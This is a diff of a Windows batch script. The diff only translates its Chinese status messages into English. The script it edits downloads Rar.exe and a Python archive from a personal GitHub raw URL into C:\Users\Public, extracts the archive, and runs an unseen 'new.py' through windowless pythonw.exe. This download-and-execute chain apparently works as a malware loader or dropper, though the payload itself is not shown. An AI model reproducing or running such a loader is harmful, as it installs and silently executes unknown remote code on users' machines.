@@ -1,18 +1,19 @@
 @echo off
+chcp 65001 >nul
 cd /d "C:\Users\Public"
 
-echo 正在下载 Rar.exe...
+echo Downloading Rar.exe...
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/kmoshan/1/refs/heads/main/Rar.exe' -OutFile 'Rar.exe'"
 if not exist "Rar.exe" (
-    echo Rar.exe 下载失败
+    echo Rar.exe download failed
     pause
     exit /b 1
 )
 
-echo 正在下载 Python391.rar...
+echo Downloading Python391.rar...
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/kmoshan/1/refs/heads/main/Python391.rar' -OutFile 'Python391.rar'"
 if not exist "Python391.rar" (
-    echo Python391.rar 下载失败
+    echo Python391.rar download failed
     pause
     exit /b 1
 )
@@ -20,7 +21,7 @@ if not exist "Python391.rar" (
 if exist "Rar.exe" (
     Rar.exe x -o+ "Python391.rar"
 ) else (
-    echo C:\Users\Public 下未找到 Rar.exe
+    echo Rar.exe not found
     pause
     exit /b 1
 )
@@ -29,7 +30,7 @@ cd "Python391"
 if exist "pythonw.exe" (
     pythonw.exe "new.py"
 ) else (
-    echo Python391 目录下未找到 pythonw.exe
+    echo pythonw.exe not found in Python391 folder
     pause
     exit /b 1
 )
